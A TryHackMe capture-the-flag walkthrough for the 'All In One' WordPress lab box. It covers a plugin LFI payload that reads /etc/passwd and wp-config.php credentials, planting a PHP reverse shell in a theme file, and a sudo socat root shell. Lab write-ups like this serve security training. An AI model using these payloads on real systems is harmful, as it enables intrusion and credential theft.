# All In One
[TryHackMe room link](https://tryhackme.com/room/allinonemj)

# Informations about the room
> This box's intention is to help you practice several ways in exploiting a system. There is few intended paths to exploit it and few unintended paths to get root.
Try to discover and exploit them all. Do not just exploit it using intended paths, hack like a pro and enjoy the box !

# Open ports

21 ftp with anonymous access

22 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

80 Apache httpd 2.4.29 ((Ubuntu))

# Enumeration

With directory enumeration you will find a /wordpress directory

Using WPScan 2 plugins are vulnerable:

```
MailMasta plugin vulnerable to LFI
http://10.10.52.146/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Plugin reflex-gallery vulnerable to arbitrary file upload
[https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/)
```

With WPScan it's possible to enumerate wordpress users:
`wpscan --url 10.10.52.146/wordpress -e u`

We find the user `elyana`

Using the MailMasta LFI and some php encoding we can display the wordpress configuration file containing credentials:

`http://10.10.52.146/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php`

After logging in modify the `404.php` file with a php reverse shell

# Privilege escalation

We got a shell with the user `www-data`

We cannot cat the flag just yet, but we are provided with a hint:

```
Elyana's user password is hidden in the system. Find it ;)
```

After searching around in the file system we find a `private.txt` file

```
user: elyana
password: REDACTED
```

The user flag is base64 encoded:

```bash
echo "REDACTED" | base64 -d 
THM{REDACTED}
```

After logging in with user `elyana` we can use `sudo -l` and it turns out that it's possible to use `socat` with root permissions 

```console
sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
 ```
 
You can spawn a shell with `socat` using:

```console
sudo socat stdin exec:/bin/sh
```

Now we are root

The root flag is encoded in base64 too:

```bash
echo "REDACTED" | base64
THM{REDACTED}
```
